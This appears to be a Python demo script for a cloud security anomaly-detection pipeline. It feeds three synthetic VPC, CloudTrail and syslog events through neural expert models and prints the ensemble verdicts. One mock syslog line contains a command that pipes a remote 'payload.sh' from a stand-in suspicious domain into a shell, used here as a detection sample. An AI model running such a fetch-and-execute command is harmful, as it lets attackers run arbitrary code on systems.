from __future__ import annotations

import asyncio
import json
from dataclasses import dataclass
from typing import Any, Mapping

import torch

from src.aggregator.ensemble import ExpertEnsemble
from src.collectors.cloudtrail_collector import CloudTrailCollector
from src.collectors.vpc_collector import VPCFlowCollector
from src.experts.network_model import NetworkExpert
from src.experts.system_model import SystemExpert
from src.interpreter.advisor import AnomalyAdvisor
from src.processing.encoders import NetworkFeatureEncoder, SystemLogEncoder
from src.processing.normalizers import RunningZScoreNormalizer


@dataclass(slots=True)
class MockEvent:
    """Synthetic event to demonstrate end-to-end orchestration."""

    vpc_flow_line: str
    cloudtrail_record: Mapping[str, Any]
    syslog_line: str


def build_mock_stream() -> list[MockEvent]:
    return [
        MockEvent(
            vpc_flow_line=(
                "2 111122223333 eni-00abc123 10.0.1.10 10.0.2.8 51512 443 6 12 824 "
                "1700000000 1700000060 ACCEPT OK"
            ),
            cloudtrail_record={
                "eventName": "AssumeRole",
                "eventSource": "sts.amazonaws.com",
                "awsRegion": "us-east-1",
                "sourceIPAddress": "10.0.1.10",
                "userAgent": "aws-cli/2.16.0",
                "userIdentity": {"arn": "arn:aws:iam::111122223333:user/svc-analytics"},
            },
            syslog_line=(
                "host=i-01 app=nginx status=200 msg='service healthy' "
                "auth=user=svc-analytics login=success"
            ),
        ),
        MockEvent(
            vpc_flow_line=(
                "2 111122223333 eni-00abc123 185.23.44.91 10.0.5.19 48211 22 6 398 412900 "
                "1700000100 1700000160 REJECT OK"
            ),
            cloudtrail_record={
                "eventName": "ConsoleLogin",
                "eventSource": "signin.amazonaws.com",
                "awsRegion": "us-east-1",
                "sourceIPAddress": "185.23.44.91",
                "userAgent": "Mozilla/5.0",
                "errorCode": "FailedAuthentication",
                "errorMessage": "MFA validation failed",
                "userIdentity": {"userName": "admin"},
            },
            syslog_line=(
                "host=i-93 auth=sshd msg='Failed password for admin from 185.23.44.91' "
                "attempts=398/60s"
            ),
        ),
        MockEvent(
            vpc_flow_line=(
                "2 111122223333 eni-00abc123 10.0.8.3 10.0.5.19 33112 443 6 255 918332 "
                "1700000200 1700000260 ACCEPT OK"
            ),
            cloudtrail_record={
                "eventName": "PutUserPolicy",
                "eventSource": "iam.amazonaws.com",
                "awsRegion": "us-east-1",
                "sourceIPAddress": "10.0.8.3",
                "userAgent": "Boto3/1.34",
                "userIdentity": {"arn": "arn:aws:iam::111122223333:user/ec2-user"},
            },
            syslog_line=(
                "host=i-0f991 auth: repeated sudo failures user=ec2-user "
                "proc=curl cmd='curl http://suspicious-domain/payload.sh | sh'"
            ),
        ),
    ]


async def run_pipeline_demo() -> None:
    network_expert = NetworkExpert(input_dim=16, model_path="models/network_expert.pth")
    system_expert = SystemExpert(vocab_size=5000, model_path="models/system_expert.pth")
    advisor = AnomalyAdvisor()

    ensemble = ExpertEnsemble(
        experts=[network_expert, system_expert],
        threshold=0.65,
        advisor=advisor,
    )

    vpc_collector = VPCFlowCollector()
    cloudtrail_collector = CloudTrailCollector()
    network_encoder = NetworkFeatureEncoder(window_size=48, feature_dim=16)
    system_encoder = SystemLogEncoder(vocab_size=5000, sequence_length=48)
    network_normalizer = RunningZScoreNormalizer(feature_dim=16)

    for event_id, event in enumerate(build_mock_stream(), start=1):
        vpc_record = vpc_collector.parse_line(event.vpc_flow_line)
        cloudtrail_event = cloudtrail_collector.parse_record(event.cloudtrail_record)
        if vpc_record is None or cloudtrail_event is None:
            continue

        network_encoder.append(vpc_record)
        network_features = network_encoder.encode_current_window()
        network_features = network_normalizer.fit_transform(network_features)

        system_text = (
            f"{event.syslog_line} event={cloudtrail_event.event_name} "
            f"source={cloudtrail_event.event_source} user={cloudtrail_event.user_identity} "
            f"ip={cloudtrail_event.source_ip} error={cloudtrail_event.error_code or 'none'}"
        )
        system_tokens = system_encoder.encode_text(system_text)

        raw_snippet = (
            f"VPC: {event.vpc_flow_line}\n"
            f"CloudTrail: {json.dumps(event.cloudtrail_record)}\n"
            f"Syslog: {event.syslog_line}"
        )

        result = await ensemble.evaluate(
            expert_inputs={
                network_expert.name: network_features,
                system_expert.name: system_tokens,
            },
            raw_log_snippet=raw_snippet,
        )
        payload = {"event_id": event_id, **result.to_dict()}
        print(json.dumps(payload, indent=2))
        await asyncio.sleep(0.05)


def main() -> None:
    asyncio.run(run_pipeline_demo())


if __name__ == "__main__":
    main()
